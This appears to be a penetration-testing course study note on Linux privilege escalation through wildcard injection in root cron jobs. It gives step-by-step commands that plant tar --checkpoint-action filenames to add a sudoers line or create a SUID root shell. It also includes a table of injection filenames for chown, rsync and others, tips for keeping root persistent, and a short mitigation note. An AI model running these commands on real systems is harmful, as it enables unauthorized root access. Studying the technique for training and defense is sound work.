# Section 6 — Wildcard Abuse

> **No lab / no questions** — technique section. Companion: §7 (cron) — wildcard abuse is almost always *delivered via* a root cron/script.

## Concept

The shell expands wildcards **before** the command runs, turning matching filenames into separate arguments. If a privileged script/cron runs a command with an unquoted `*` in a directory **you can write to**, you create files whose *names are command-line options* — the program receives them as flags, not data.

| Char | Meaning |
|------|---------|
| `*` | any number of chars in a filename |
| `?` | exactly one char |
| `[ ]` | any one char at that position |
| `[a-z]` | range (hyphen inside brackets) |
| `~` | home dir (`~user` = that user's home) |

The vulnerable pattern: **`<cmd> ... *` run as root, in a directory you can write to** (cron, backup script, maintenance job).

---

## Primary technique — `tar --checkpoint-action` (the classic)

Vulnerable root cron (runs in a writable dir, `*` unquoted):
```bash
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```
`tar`'s `--checkpoint[=N]` + `--checkpoint-action=exec=<cmd>` run an arbitrary command. Plant filenames that *are* those options:

```bash
cd /home/htb-student                       # the dir the cron globs with *
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh root.sh"
ls -la                                     # confirm the 3 files exist
# wait for the cron to fire, then:
sudo -l        # -> (root) NOPASSWD: ALL
sudo su -      # root
```
> When `tar -zcf backup.tar.gz *` expands, `*` includes `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` — `tar` parses them as options and executes `sh root.sh` **as root** (cron owner). `root.sh` grants us NOPASSWD sudo. Payload alternatives: copy `/bin/bash` SUID, add SSH key to `/root/.ssh`, reverse shell.

---

## Other wildcard-injection vectors (know these too)

| Privileged cmd on `*` | Inject (filenames) | Effect |
|-----------------------|--------------------|--------|
| `tar * ` | `--checkpoint=1`, `--checkpoint-action=exec=sh x.sh` | RCE as cron user |
| `chown -R user *` | `--reference=ref` (own a file you control perms/owner of) | chown arbitrary file |
| `chmod -R 777 *` | `--reference=ref` | chmod arbitrary file |
| `rsync * ...` | `-e sh x.sh` (filename) | RCE |
| `7z a a.7z *` | `@x` + symlink trick | arbitrary file read |
| `zip a.zip * ` | `--unzip-command=...` (older) / TZ tricks | RCE in some setups |
| `cp/mv * dest` | crafted names / symlinks | overwrite/clobber |

```bash
# chown --reference example (turn a file root-owned to ours via a cron `chown -R x *`):
touch -- "--reference=myfile"      # myfile owned by us -> target gets our ownership
# rsync -e example:
touch -- "-e sh shell.sh"
```
> Check `man <cmd>` for any option that **executes** (`exec`, `-e`, `--use-compress-program`, `--checkpoint-action`) or **dereferences** (`--reference`) — those are the injectable ones.

---

## Finding the opportunity

```bash
# writable dirs that a root job might glob in:
find / -path /proc -prune -o -type d -perm -o+w -print 2>/dev/null
# cron / scripts that use an unquoted * on a writable path:
cat /etc/crontab; ls -la /etc/cron.*; cat /etc/cron.d/* 2>/dev/null
grep -rlE '\*' /etc/cron* /opt /usr/local/bin 2>/dev/null
pspy64   # watch jobs run live (see the exact tar/chown/* command + cwd) - §7
```
> The two ingredients: a **root-run command with an unquoted glob** + a **directory you can write to** that it globs. `pspy` (no root needed) reveals the exact command and working directory of cron jobs so you know which wildcard to weaponise.

---

## Exam / Engagement Notes

- **`tar` cron + `*` in a writable dir = `--checkpoint-action=exec` → root.** Memorise the 3-file drop.
- Filenames starting with `-` are arg-injection: create with `echo > "--option"` or `touch -- "--option"`.
- Quote the payload script's effect to something durable (sudoers line / SUID bash / SSH key) so you keep root after the job finishes.
- Mitigation (report): quote globs (`"$dir"/*` won't help — use `./*` or `--` end-of-options, or absolute file lists), set `secure_path`, avoid `*` in privileged scripts.
- Pairs with: §5 (PATH), §7 (cron — the delivery mechanism), §10 (SUID payloads).

---

## Quick reference

```bash
# tar wildcard -> root (run inside the dir the root cron tars with *):
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' > x.sh
echo "" > "--checkpoint=1"; echo "" > "--checkpoint-action=exec=sh x.sh"
# after cron runs:
/tmp/rootbash -p        # euid=root
```

> One line: a root `tar/chown/rsync ... *` in a dir you can write to lets you smuggle option-filenames the program executes as root.
